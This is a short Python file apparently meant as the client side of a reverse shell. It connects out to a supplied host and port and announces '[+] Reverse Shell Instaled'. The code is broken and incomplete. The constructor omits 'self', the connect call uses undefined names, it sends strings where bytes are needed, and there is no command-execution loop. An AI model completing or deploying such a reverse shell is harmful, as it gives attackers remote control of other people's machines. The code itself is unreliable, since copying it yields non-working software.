import socket 

class Server:
  def __init__(host, port):
    self.host = host
    self.port = port
    self.socket = None
    self.data = None 
  def server(self):
    try:
      self.socket = socket.socket(
        socket.AF_INET,
        socket.SOCK_STREAM 
      )
      self.socket.connect((host, port))
      host_name, port_name = self.socket.getsockname()
      self.socket.send(f"[+] HOST > {host_name}\n")
      self.socket.send(f"[+] Reverse Shell Instaled\n")
    except Exception as e:
      self.socket.send(f"Error {e}")
